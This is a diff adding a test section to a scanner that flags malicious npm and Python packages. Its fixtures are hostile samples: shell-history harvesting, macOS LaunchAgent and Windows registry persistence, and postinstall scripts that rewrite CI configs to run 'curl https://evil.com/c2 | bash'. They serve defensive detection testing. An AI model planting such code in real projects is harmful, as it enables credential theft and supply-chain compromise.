@@ -382,6 +382,94 @@ assertBelowThreshold('utility with setTimeout', 'lib/utils.js', LEGIT_UTILITY);
 assertBelowThreshold('feature-flag date check', 'lib/flags.js', LEGIT_DATE_CHECK);
 
 // ─────────────────────────────────────────────────────────────────────────────
+// Section 8: New indicator gaps — shell history, platform persistence, CI/CD
+// ─────────────────────────────────────────────────────────────────────────────
+console.log('\n── New indicators: shell history, platform persist, CI/CD platforms ──');
+
+// Shell history harvesting — common in credential-exfil payloads
+const BASH_HISTORY_HARVEST = `
+import os, subprocess
+home = os.path.expanduser('~')
+for f in ['.bash_history', '.zsh_history']:
+    path = os.path.join(home, f)
+    if os.path.exists(path):
+        with open(path) as fh:
+            data += fh.read()
+`;
+const bashHistoryResult = triage('setup.py', BASH_HISTORY_HARVEST);
+assert(
+  `bash_history harvest fires credential-files (score ${bashHistoryResult?.score ?? 0})`,
+  (bashHistoryResult?.categories.has('creds') ?? false) && (bashHistoryResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// macOS LaunchAgents — persistence via user-level launch daemon
+const LAUNCHAGENTS_PERSIST = `
+import os, plistlib
+agent = {
+    'Label': 'com.update.service',
+    'ProgramArguments': ['/usr/bin/python3', '/tmp/payload.py'],
+    'RunAtLoad': True,
+}
+path = os.path.expanduser('~/Library/LaunchAgents/com.update.service.plist')
+with open(path, 'wb') as f:
+    plistlib.dump(agent, f)
+os.system('launchctl load ' + path)
+`;
+const launchAgentsResult = triage('setup.py', LAUNCHAGENTS_PERSIST);
+assert(
+  `LaunchAgents write fires system-persist (score ${launchAgentsResult?.score ?? 0})`,
+  (launchAgentsResult?.categories.has('persist') ?? false) && (launchAgentsResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// Windows registry run key — persistence via HKEY_CURRENT_USER
+const REGISTRY_PERSIST = `
+const { execSync } = require('child_process');
+execSync('reg.exe add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\tmp\\\\payload.exe /f');
+`;
+const registryResult = triage('scripts/install.js', REGISTRY_PERSIST);
+assert(
+  `Windows registry run-key fires system-persist (score ${registryResult?.score ?? 0})`,
+  (registryResult?.categories.has('persist') ?? false) && (registryResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// CircleCI config poisoning
+const CIRCLECI_POISON = `
+const fs = require('fs');
+const path = require('path');
+const payload = \`version: 2.1\\njobs:\\n  build:\\n    steps:\\n      - run: curl https://evil.com/c2 | bash\`;
+fs.writeFileSync('.circleci/config.yml', payload);
+`;
+const circleciResult = triage('scripts/postinstall.js', CIRCLECI_POISON);
+assert(
+  `CircleCI config write fires ci-workflow-write (score ${circleciResult?.score ?? 0})`,
+  (circleciResult?.categories.has('cicd') ?? false) && (circleciResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// Azure Pipelines config poisoning
+const AZURE_POISON = `
+const fs = require('fs');
+fs.writeFileSync('azure-pipelines.yml',
+  'trigger:\\n- main\\njobs:\\n- job: Build\\n  steps:\\n  - script: curl https://evil.com/c2 | bash'
+);
+`;
+const azureResult = triage('scripts/postinstall.js', AZURE_POISON);
+assert(
+  `Azure Pipelines config write fires ci-workflow-write (score ${azureResult?.score ?? 0})`,
+  (azureResult?.categories.has('cicd') ?? false) && (azureResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// Travis CI config poisoning
+const TRAVIS_POISON = `
+const fs = require('fs');
+fs.writeFileSync('.travis.yml', 'language: node_js\\nafter_success:\\n  - curl https://evil.com/c2 | bash');
+`;
+const travisResult = triage('scripts/postinstall.js', TRAVIS_POISON);
+assert(
+  `Travis CI config write fires ci-workflow-write (score ${travisResult?.score ?? 0})`,
+  (travisResult?.categories.has('cicd') ?? false) && (travisResult?.score ?? 0) >= MIN_TRIAGE_SCORE
+);
+
+// ─────────────────────────────────────────────────────────────────────────────
 // Summary
 // ─────────────────────────────────────────────────────────────────────────────
 console.log(`\n── Results: ${passed} passed, ${failed} failed ──\n`);
